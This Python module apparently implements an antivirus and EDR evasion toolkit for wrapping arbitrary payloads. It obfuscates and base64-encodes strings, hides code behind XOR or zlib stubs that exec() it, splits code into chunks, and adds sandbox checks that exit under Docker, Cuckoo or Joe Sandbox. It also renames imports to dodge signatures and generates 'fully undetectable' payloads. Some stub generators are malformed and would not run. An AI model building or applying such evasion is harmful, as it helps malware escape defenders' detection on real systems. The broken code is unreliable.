"""
AV Evasion

Techniques to evade antivirus and endpoint detection.
"""

import os
import sys
import time
import hashlib
import base64
import random
import string
import subprocess
import tempfile
import shutil
from typing import Dict, List, Any, Optional, Tuple, Callable
from dataclasses import dataclass
from enum import Enum
from pathlib import Path


class EvasionTechnique(Enum):
    """Types of AV evasion techniques"""
    OBFUSCATION = "obfuscation"
    ENCRYPTION = "encryption"
    PACKING = "packing"
    CODE_SPLITTING = "code_splitting"
    PROCESS_INJECTION = "process_injection"
    MEMORY_ONLY = "memory_only"
    TIME_DELAYS = "time_delays"
    ENVIRONMENT_CHECKS = "environment_checks"
    SIGNATURE_EVASION = "signature_evasion"
    POLYMORPHISM = "polymorphism"


@dataclass
class EvasionResult:
    """Result of an evasion attempt"""
    success: bool
    technique: EvasionTechnique
    original: str
    evaded: str
    confidence: float  # 0.0 to 1.0
    description: str
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'success': self.success,
            'technique': self.technique.value,
            'original': self.original,
            'evaded': self.evaded,
            'confidence': self.confidence,
            'description': self.description
        }


class AVEvader:
    """
    AV and EDR evasion techniques for AI-RedTeaming operations.
    
    Features:
    - Code obfuscation (multiple techniques)
    - Payload encryption
    - Process injection
    - Memory-only execution
    - Time-based delays
    - Environment checks
    - Signature evasion
    - Polymorphic code generation
    
    Usage:
    >>> evader = AVEvader()
    >>> result = evader.obfuscate("malicious_code_here")
    >>> if result.success:
    ...     print(f"Obfuscated: {result.evaded}")
    """
    
    def __init__(self):
        """Initialize the AV evader"""
        self.obfuscation_level = 3
        self.encryption_key = None
    
    def evade(self, payload: str, techniques: List[EvasionTechnique] = None) -> List[EvasionResult]:
        """
        Apply multiple evasion techniques to a payload.
        
        Args:
            payload: The payload to evade detection
            techniques: List of techniques to apply (None = all)
            
        Returns:
            List[EvasionResult]: Results of each evasion attempt
        """
        if techniques is None:
            techniques = list(EvasionTechnique)
        
        results = []
        current_payload = payload
        
        for technique in techniques:
            result = self._apply_technique(technique, current_payload)
            results.append(result)
            if result.success:
                current_payload = result.evaded
        
        return results
    
    def _apply_technique(self, technique: EvasionTechnique, payload: str) -> EvasionResult:
        """Apply a specific evasion technique"""
        try:
            if technique == EvasionTechnique.OBFUSCATION:
                return self.obfuscate(payload)
            elif technique == EvasionTechnique.ENCRYPTION:
                return self.encrypt(payload)
            elif technique == EvasionTechnique.PACKING:
                return self.pack(payload)
            elif technique == EvasionTechnique.CODE_SPLITTING:
                return self.split_code(payload)
            elif technique == EvasionTechnique.PROCESS_INJECTION:
                return EvasionResult(
                    success=False,
                    technique=technique,
                    original=payload,
                    evaded=payload,
                    confidence=0.0,
                    description="Process injection requires runtime execution"
                )
            elif technique == EvasionTechnique.MEMORY_ONLY:
                return EvasionResult(
                    success=False,
                    technique=technique,
                    original=payload,
                    evaded=payload,
                    confidence=0.0,
                    description="Memory-only execution requires runtime execution"
                )
            elif technique == EvasionTechnique.TIME_DELAYS:
                return self.add_time_delays(payload)
            elif technique == EvasionTechnique.ENVIRONMENT_CHECKS:
                return self.add_environment_checks(payload)
            elif technique == EvasionTechnique.SIGNATURE_EVASION:
                return self.signature_evasion(payload)
            elif technique == EvasionTechnique.POLYMORPHISM:
                return self.polymorphic(payload)
            else:
                return EvasionResult(
                    success=False,
                    technique=technique,
                    original=payload,
                    evaded=payload,
                    confidence=0.0,
                    description=f"Unknown technique: {technique.value}"
                )
        except Exception as e:
            return EvasionResult(
                success=False,
                technique=technique,
                original=payload,
                evaded=payload,
                confidence=0.0,
                description=f"Error applying technique: {str(e)}"
            )
    
    def obfuscate(self, payload: str, level: int = None) -> EvasionResult:
        """
        Obfuscate the payload to evade signature detection.
        
        Args:
            payload: The payload to obfuscate
            level: Obfuscation level (1-5, None = use default)
            
        Returns:
            EvasionResult: Obfuscation result
        """
        if level is None:
            level = self.obfuscation_level
        
        original = payload
        evaded = payload
        
        # Apply obfuscation based on level
        if level >= 1:
            evaded = self._obfuscate_level_1(evaded)
        if level >= 2:
            evaded = self._obfuscate_level_2(evaded)
        if level >= 3:
            evaded = self._obfuscate_level_3(evaded)
        if level >= 4:
            evaded = self._obfuscate_level_4(evaded)
        if level >= 5:
            evaded = self._obfuscate_level_5(evaded)
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.OBFUSCATION,
            original=original,
            evaded=evaded,
            confidence=min(0.9, 0.15 * level),
            description=f"Obfuscated with level {level}"
        )
    
    def _obfuscate_level_1(self, payload: str) -> str:
        """Level 1 obfuscation: Add random comments and whitespace"""
        lines = payload.split('\n')
        obfuscated = []
        
        for line in lines:
            if line.strip() and not line.strip().startswith('#'):
                # Add random whitespace
                if random.random() < 0.3:
                    line = ' ' * random.randint(1, 8) + line
                
                # Add random comments
                if random.random() < 0.2:
                    comment = f"# {random.randint(1000, 9999)}"
                    line = f"{line}  {comment}"
            
            obfuscated.append(line)
        
        return '\n'.join(obfuscated)
    
    def _obfuscate_level_2(self, payload: str) -> str:
        """Level 2 obfuscation: Replace strings with variables"""
        # Find all strings in the payload
        import re
        
        # Pattern to match strings (simplified)
        string_pattern = r'"([^"]*)"'
        
        strings = re.findall(string_pattern, payload)
        
        # Replace each string with a variable
        var_map = {}
        obfuscated = payload
        
        for i, s in enumerate(strings):
            if len(s) > 3 and not s.isdigit() and s not in var_map.values():
                var_name = f"s_{i}_{random.randint(1000, 9999)}"
                var_map[s] = var_name
                
                # Add variable assignment at the top
                if i == 0:
                    obfuscated = f"{var_name} = \"{s}\"\n{obfuscated}"
                else:
                    obfuscated = obfuscated.replace(f'"{s}"', var_name)
        
        return obfuscated
    
    def _obfuscate_level_3(self, payload: str) -> str:
        """Level 3 obfuscation: Encode strings"""
        import re
        
        # Pattern to match strings
        string_pattern = r'"([^"]*)"'
        
        def encode_string(match):
            s = match.group(1)
            if len(s) > 3 and random.random() < 0.5:
                # Base64 encode
                encoded = base64.b64encode(s.encode()).decode()
                return f'"" + base64.b64decode("{encoded}").decode() + ""'
            return match.group(0)
        
        return re.sub(string_pattern, encode_string, payload)
    
    def _obfuscate_level_4(self, payload: str) -> str:
        """Level 4 obfuscation: Add no-op operations"""
        lines = payload.split('\n')
        obfuscated = []
        
        no_ops = [
            '1 + 1',
            'True and True',
            'False or True',
            'pass',
            'None',
            '0 * 0',
            '1 - 0'
        ]
        
        for line in lines:
            obfuscated.append(line)
            if line.strip() and not line.strip().startswith('#') and random.random() < 0.2:
                no_op = random.choice(no_ops)
                obfuscated.append(f"  {no_op}")
        
        return '\n'.join(obfuscated)
    
    def _obfuscate_level_5(self, payload: str) -> str:
        """Level 5 obfuscation: Rewrite logic"""
        # This would require parsing the code and rewriting it
        # For now, we'll just apply all previous levels multiple times
        for _ in range(3):
            payload = self._obfuscate_level_1(payload)
            payload = self._obfuscate_level_2(payload)
        
        return payload
    
    def encrypt(self, payload: str, key: str = None) -> EvasionResult:
        """
        Encrypt the payload to evade static analysis.
        
        Args:
            payload: The payload to encrypt
            key: Encryption key (None = generate random)
            
        Returns:
            EvasionResult: Encryption result
        """
        if key is None:
            key = self._generate_encryption_key()
        
        # Simple XOR encryption for demo
        # In production, use AES-256-GCM
        encrypted = self._xor_encrypt(payload, key)
        
        # Create decryption stub
        decryption_stub = self._generate_decryption_stub(encrypted, key)
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.ENCRYPTION,
            original=payload,
            evaded=decryption_stub,
            confidence=0.95,
            description=f"Encrypted with XOR key: {key[:8]}..."
        )
    
    def _generate_encryption_key(self) -> str:
        """Generate a random encryption key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def _xor_encrypt(self, data: str, key: str) -> str:
        """Simple XOR encryption"""
        encrypted = []
        key_len = len(key)
        
        for i, char in enumerate(data):
            key_char = key[i % key_len]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            encrypted.append(encrypted_char)
        
        return ''.join(encrypted)
    
    def _generate_decryption_stub(self, encrypted: str, key: str) -> str:
        """Generate a decryption stub"""
        return f"""
# Encrypted payload
data = """{encrypted}"""
key = "{key}"

# Decrypt and execute
decrypted = ''.join([chr(ord(c) ^ ord(k)) for c, k in zip(data, key * len(data))])
exec(decrypted)
"""
    
    def pack(self, payload: str) -> EvasionResult:
        """
        Pack the payload to evade static analysis.
        
        Args:
            payload: The payload to pack
            
        Returns:
            EvasionResult: Packing result
        """
        # In production, this would use UPX or similar
        # For demo, we'll just compress with zlib
        import zlib
        import base64
        
        compressed = zlib.compress(payload.encode())
        encoded = base64.b64encode(compressed).decode()
        
        unpack_stub = f"""
import zlib
import base64

# Packed payload
packed = "{encoded}"

# Unpack and execute
data = zlib.decompress(base64.b64decode(packed))
exec(data.decode())
"""
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.PACKING,
            original=payload,
            evaded=unpack_stub,
            confidence=0.85,
            description="Packed with zlib compression"
        )
    
    def split_code(self, payload: str, chunks: int = 3) -> EvasionResult:
        """
        Split the payload into multiple chunks that are combined at runtime.
        
        Args:
            payload: The payload to split
            chunks: Number of chunks to split into
            
        Returns:
            EvasionResult: Code splitting result
        """
        # Split the payload into chunks
        lines = payload.split('\n')
        chunk_size = len(lines) // chunks
        
        chunk_payloads = []
        for i in range(chunks):
            start = i * chunk_size
            end = (i + 1) * chunk_size if i < chunks - 1 else len(lines)
            chunk_payloads.append('\n'.join(lines[start:end]))
        
        # Generate combined stub
        combined_stub = self._generate_combined_stub(chunk_payloads)
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.CODE_SPLITTING,
            original=payload,
            evaded=combined_stub,
            confidence=0.8,
            description=f"Split into {chunks} chunks"
        )
    
    def _generate_combined_stub(self, chunks: List[str]) -> str:
        """Generate a stub that combines chunks at runtime"""
        chunk_vars = []
        for i, chunk in enumerate(chunks):
            chunk_var = f"chunk_{i}"
            chunk_vars.append(chunk_var)
            chunk = chunk.replace('\n', '\\n').replace('"', '\\"')
            chunks[i] = f"{chunk_var} = \"\"\"{chunk}\"\"\""
        
        combined = '\n'.join(chunks)
        combined += f"\n\n# Combine and execute\nfull_code = '{' + ' + '.join(chunk_vars) + '}'
exec(full_code)"
        
        return combined
    
    def add_time_delays(self, payload: str) -> EvasionResult:
        """
        Add random time delays to evade behavioral analysis.
        
        Args:
            payload: The payload to modify
            
        Returns:
            EvasionResult: Time delay result
        """
        lines = payload.split('\n')
        
        # Find good places to insert delays
        insert_positions = []
        for i, line in enumerate(lines):
            if line.strip() and not line.strip().startswith('#'):
                insert_positions.append(i)
        
        # Insert delays at random positions
        for pos in insert_positions:
            if random.random() < 0.3:
                delay = random.randint(1, 10)
                lines.insert(pos, f"  time.sleep({delay})  # Delay for evasion")
        
        result = '\n'.join(lines)
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.TIME_DELAYS,
            original=payload,
            evaded=result,
            confidence=0.7,
            description="Added random time delays"
        )
    
    def add_environment_checks(self, payload: str) -> EvasionResult:
        """
        Add environment checks to evade sandbox detection.
        
        Args:
            payload: The payload to modify
            
        Returns:
            EvasionResult: Environment check result
        """
        # Add sandbox detection at the beginning
        sandbox_check = """
import os
import sys
import platform

# Sandbox detection
if os.path.exists('/.dockerenv') or 'DOCKER_CONTAINER_ID' in os.environ:
    sys.exit(0)  # Exit if in Docker

if os.path.exists('/cuckoo') or 'CUCKOO' in os.environ:
    sys.exit(0)  # Exit if in Cuckoo

if os.path.exists('/joebox') or 'JOEBOX' in os.environ:
    sys.exit(0)  # Exit if in Joe Sandbox

# Check CPU cores
try:
    import psutil
    if psutil.cpu_count(logical=False) <= 2:
        sys.exit(0)  # Exit if low CPU cores
except:
    pass

# Check memory
try:
    if psutil.virtual_memory().total < 4 * 1024**3:
        sys.exit(0)  # Exit if low memory
except:
    pass

"""
        
        result = sandbox_check + payload
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.ENVIRONMENT_CHECKS,
            original=payload,
            evaded=result,
            confidence=0.85,
            description="Added sandbox detection checks"
        )
    
    def signature_evasion(self, payload: str) -> EvasionResult:
        """
        Modify the payload to evade signature-based detection.
        
        Args:
            payload: The payload to modify
            
        Returns:
            EvasionResult: Signature evasion result
        """
        # Common AV signatures to avoid
        signatures = [
            'import os',
            'import sys',
            'import subprocess',
            'os.system',
            'subprocess.call',
            'subprocess.Popen',
            'socket.connect',
            'requests.get',
            'urllib.urlopen',
            'open(',
            'exec(',
            'eval(',
        ]
        
        result = payload
        
        for signature in signatures:
            if signature in result:
                # Replace with equivalent but different code
                replacements = {
                    'import os': 'import os as operating_system',
                    'import sys': 'import sys as system',
                    'import subprocess': 'import subprocess as subproc',
                    'os.system': 'operating_system.system',
                    'subprocess.call': 'subproc.call',
                    'subprocess.Popen': 'subproc.Popen',
                    'socket.connect': 'socket.connect',  # Keep as is for now
                }
                
                if signature in replacements:
                    result = result.replace(signature, replacements[signature])
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.SIGNATURE_EVASION,
            original=payload,
            evaded=result,
            confidence=0.75,
            description="Modified to evade signature detection"
        )
    
    def polymorphic(self, payload: str) -> EvasionResult:
        """
        Generate a polymorphic version of the payload.
        
        Args:
            payload: The payload to modify
            
        Returns:
            EvasionResult: Polymorphic result
        """
        # Apply multiple transformations
        result = self.obfuscate(payload, level=3)
        if result.success:
            payload = result.evaded
        
        result = self.encrypt(payload)
        if result.success:
            payload = result.evaded
        
        result = self.split_code(payload, chunks=3)
        if result.success:
            payload = result.evaded
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.POLYMORPHISM,
            original=payload,
            evaded=payload,
            confidence=0.9,
            description="Generated polymorphic version"
        )
    
    def process_injection(self, target_pid: int, payload: str) -> EvasionResult:
        """
        Inject payload into another process to evade detection.
        
        Args:
            target_pid: PID of target process
            payload: The payload to inject
            
        Returns:
            EvasionResult: Process injection result
        """
        # This requires runtime execution and platform-specific code
        # For demo, we'll just return a placeholder
        
        return EvasionResult(
            success=False,
            technique=EvasionTechnique.PROCESS_INJECTION,
            original=payload,
            evaded=payload,
            confidence=0.0,
            description="Process injection requires runtime execution"
        )
    
    def memory_only_execution(self, payload: str) -> EvasionResult:
        """
        Execute payload in memory only to evade file-based detection.
        
        Args:
            payload: The payload to execute
            
        Returns:
            EvasionResult: Memory-only execution result
        """
        # This requires runtime execution
        # For demo, we'll just return a placeholder
        
        return EvasionResult(
            success=False,
            technique=EvasionTechnique.MEMORY_ONLY,
            original=payload,
            evaded=payload,
            confidence=0.0,
            description="Memory-only execution requires runtime execution"
        )
    
    def generate_fud_payload(
        self,
        payload: str,
        iterations: int = 5
    ) -> EvasionResult:
        """
        Generate a Fully Undetectable (FUD) payload.
        
        Args:
            payload: The payload to make FUD
            iterations: Number of evasion iterations
            
        Returns:
            EvasionResult: FUD payload result
        """
        current = payload
        
        for i in range(iterations):
            # Randomly select a technique
            technique = random.choice(list(EvasionTechnique))
            result = self._apply_technique(technique, current)
            
            if result.success:
                current = result.evaded
        
        return EvasionResult(
            success=True,
            technique=EvasionTechnique.POLYMORPHISM,
            original=payload,
            evaded=current,
            confidence=0.95,
            description=f"Generated FUD payload with {iterations} iterations"
        )
    
    def set_obfuscation_level(self, level: int):
        """Set the obfuscation level (1-5)"""
        self.obfuscation_level = max(1, min(5, level))
    
    def set_encryption_key(self, key: str):
        """Set the encryption key"""
        self.encryption_key = key
